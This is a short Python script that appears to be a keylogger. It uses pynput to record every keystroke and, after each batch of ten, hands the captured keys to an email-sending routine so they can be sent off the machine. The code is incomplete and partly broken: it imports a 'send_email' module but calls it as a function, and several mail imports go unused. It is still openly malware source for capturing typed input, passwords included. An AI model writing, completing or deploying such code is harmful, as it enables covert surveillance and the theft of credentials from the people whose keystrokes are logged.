import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ssl
import os
import send_email

count = 0
keys = []

def on_press(key):
    global keys, count
    print(f"{key} pressed")
    keys.append(str(key))
    count += 1

    if count >= 10:  # Send email after 10 keystrokes
        count = 0
        message = ''.join(keys).replace("'", "")
        send_email(message)
        keys = []  # Reset the list of keys after sending

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()